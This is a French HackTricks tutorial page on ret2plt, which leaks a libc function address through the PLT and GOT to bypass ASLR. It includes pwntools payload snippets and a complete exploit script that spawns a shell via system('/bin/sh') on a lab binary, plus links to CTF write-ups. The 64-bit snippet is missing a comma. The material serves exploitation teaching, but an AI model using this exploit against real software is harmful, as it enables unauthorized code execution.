# Ret2plt

{{#include ../../../banners/hacktricks-training.md}}

## Informations de base

Le but de cette technique serait de **fuiter une adresse d'une fonction du PLT** pour pouvoir contourner l'ASLR. Cela est dû au fait que si, par exemple, vous fuites l'adresse de la fonction `puts` de la libc, vous pouvez alors **calculer où se trouve la base de `libc`** et calculer des décalages pour accéder à d'autres fonctions telles que **`system`**.

Cela peut être fait avec un payload `pwntools` tel que ([**from here**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt_and_got)):
```python
# 32-bit ret2plt
payload = flat(
b'A' * padding,
elf.plt['puts'],
elf.symbols['main'],
elf.got['puts']
)

# 64-bit
payload = flat(
b'A' * padding,
POP_RDI,
elf.got['puts']
elf.plt['puts'],
elf.symbols['main']
)
```
Notez comment **`puts`** (utilisant l'adresse du PLT) est appelé avec l'adresse de `puts` située dans le GOT (Global Offset Table). Cela est dû au fait qu'au moment où `puts` imprime l'entrée du GOT de puts, cette **entrée contiendra l'adresse exacte de `puts` en mémoire**.

Notez également comment l'adresse de `main` est utilisée dans l'exploit, de sorte que lorsque `puts` termine son exécution, le **binaire appelle à nouveau `main` au lieu de sortir** (de sorte que l'adresse divulguée reste valide).

> [!CAUTION]
> Notez que pour que cela fonctionne, le **binaire ne peut pas être compilé avec PIE** ou vous devez avoir **trouvé une fuite pour contourner PIE** afin de connaître l'adresse du PLT, du GOT et de main. Sinon, vous devez d'abord contourner PIE.

Vous pouvez trouver un [**exemple complet de ce contournement ici**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/ret2plt-aslr-bypass). C'était l'exploit final de cet **exemple** :
```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

p.recvline()

payload = flat(
'A' * 32,
elf.plt['puts'],
elf.sym['main'],
elf.got['puts']
)

p.sendline(payload)

puts_leak = u32(p.recv(4))
p.recvlines(2)

libc.address = puts_leak - libc.sym['puts']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
'A' * 32,
libc.sym['system'],
libc.sym['exit'],
next(libc.search(b'/bin/sh\x00'))
)

p.sendline(payload)

p.interactive()
```
## Autres exemples & Références

- [https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html)
- 64 bits, ASLR activé mais pas de PIE, la première étape consiste à remplir un débordement jusqu'au byte 0x00 du canary pour ensuite appeler puts et leaker. Avec le canary, un gadget ROP est créé pour appeler puts afin de leaker l'adresse de puts depuis le GOT et un gadget ROP pour appeler `system('/bin/sh')`
- [https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html)
- 64 bits, ASLR activé, pas de canary, débordement de pile dans main depuis une fonction enfant. Gadget ROP pour appeler puts afin de leaker l'adresse de puts depuis le GOT et ensuite appeler un one gadget.

{{#include ../../../banners/hacktricks-training.md}}
